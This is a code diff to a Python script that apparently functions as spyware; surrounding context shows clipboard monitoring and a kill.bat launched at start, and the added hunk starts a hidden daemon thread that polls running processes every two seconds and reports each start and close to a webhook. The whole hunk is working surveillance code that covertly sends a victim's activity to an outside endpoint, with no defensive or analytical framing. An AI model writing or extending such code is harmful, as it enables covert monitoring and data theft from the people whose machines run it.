@@ -142,6 +142,28 @@ def monitor_clipboard():
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
 
+def monitor_processes():
+    running_processes = set()
+    while True:
+        current_processes = set(p.name() for p in psutil.process_iter())
+        new_processes = current_processes - running_processes
+        closed_processes = running_processes - current_processes
+
+        for proc in new_processes:
+            message = f"Started: {proc}"
+            send_to_webhook(message)
+
+        for proc in closed_processes:
+            message = f"Closed: {proc}"
+            send_to_webhook(message)
+
+        running_processes = current_processes
+        time.sleep(2)  # Check every 2 seconds
+
+# Start process monitoring in a separate thread
+process_thread = threading.Thread(target=monitor_processes, daemon=True)
+process_thread.start()
+
 # Run kill.bat file at the start
 run_bat_file()
 
